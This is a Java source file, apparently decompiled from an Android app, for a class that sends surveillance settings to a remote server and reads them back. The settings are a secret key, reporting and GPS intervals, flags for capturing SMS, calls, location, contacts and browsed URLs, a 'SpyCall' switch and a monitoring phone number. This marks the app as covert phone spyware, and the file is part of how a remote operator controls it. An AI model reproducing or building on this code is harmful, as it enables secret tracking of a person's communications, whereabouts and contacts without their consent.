package iits.mamager;

import android.content.Context;
import android.os.Build;
import iits.code.dto.Setting_DTO;
import iits.common.Constants;
import iits.common.HTTPWeb;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import org.apache.http.HttpResponse;

public class SettingManager {
    private static final String TAG = "SettingManager";

    private static ArrayList<String> getArrayParameterKeySetSetting() {
        ArrayList<String> arrKey = new ArrayList<>();
        arrKey.add("deviceID");
        arrKey.add("params");
        arrKey.add("os");
        return arrKey;
    }

    private static ArrayList<String> getArrayParameterValueSetSetting(String deviceID, Setting_DTO system) {
        ArrayList<String> arrValue = new ArrayList<>();
        if (deviceID == "" || system == null) {
            return null;
        }
        arrValue.add(String.valueOf(deviceID));
        StringBuilder builder = new StringBuilder();
        builder.append("<*#94><" + String.valueOf(system.getSecretKey()) + ">,");
        builder.append("<*#32><" + String.valueOf(system.getReportTime()) + ">,");
        builder.append("<*#31><" + String.valueOf(system.getGPSInterval()) + ">,");
        if (system.getFlagSMS()) {
            builder.append("<*#13>,");
        } else {
            builder.append("<*#14>,");
        }
        if (system.getFlagCall()) {
            builder.append("<*#11>,");
        } else {
            builder.append("<*#12>,");
        }
        if (system.getFlagGPS()) {
            builder.append("<*#15>,");
        } else {
            builder.append("<*#16>,");
        }
        if (system.getFlagContact()) {
            builder.append("<*#25>,");
        } else {
            builder.append("<*#26>,");
        }
        if (system.getFlagURL()) {
            builder.append("<*#21>,");
        } else {
            builder.append("<*#22>,");
        }
        if (system.getFlagSpyCall()) {
            builder.append("<*#4>,");
        } else {
            builder.append("<*#5>,");
        }
        builder.append(Constants.SETTING_DISTANCE_FILTER);
        builder.append("<" + String.valueOf(system.getHorizontal()) + ">");
        builder.append("<" + String.valueOf(system.getVertical()) + ">,");
        builder.append(Constants.SETTING_MONITORING_PHONE);
        builder.append("<" + String.valueOf(system.getSpyCallNumber()) + ">,");
        if (system.getRunMode()) {
            builder.append(Constants.SETTING_ACTIVATE);
        } else {
            builder.append(Constants.SETTING_DEACTIVATE);
        }
        arrValue.add(builder.toString());
        arrValue.add(Constants.OS + Build.VERSION.RELEASE + "(" + Build.VERSION.SDK + ")" + "#" + "1.1");
        FileManager.WriteLog(1, TAG, "setsetting=" + builder.toString());
        return arrValue;
    }

    public static boolean setSettingToWebsite(Context context, String url, String deviceID, Setting_DTO system) {
        try {
            if (HTTPWeb.sendPostMethod(url, getArrayParameterKeySetSetting(), getArrayParameterValueSetSetting(deviceID, system)) == null) {
                return false;
            }
            return true;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on sendSettingToWebsite function: " + e.toString());
            return false;
        }
    }

    public static String getSettingFromWebsite(Context context, String url, String deviceID) {
        try {
            HttpResponse response = HTTPWeb.sendPostMethod(url, getArrayParameterKeyGetSetting(), getArrayParameterValueGetSetting(deviceID));
            String result = "";
            if (response != null) {
                result = new BufferedReader(new InputStreamReader(response.getEntity().getContent())).readLine();
            }
            return result;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on getSettingFromWebsite function: " + e.toString());
            return null;
        }
    }

    private static ArrayList<String> getArrayParameterKeyGetSetting() {
        ArrayList<String> arrKey = new ArrayList<>();
        arrKey.add("deviceID");
        arrKey.add("os");
        return arrKey;
    }

    private static ArrayList<String> getArrayParameterValueGetSetting(String deviceID) {
        ArrayList<String> arrValue = new ArrayList<>();
        if (deviceID == "") {
            return null;
        }
        arrValue.add(String.valueOf(deviceID));
        arrValue.add(Constants.OS);
        return arrValue;
    }
}
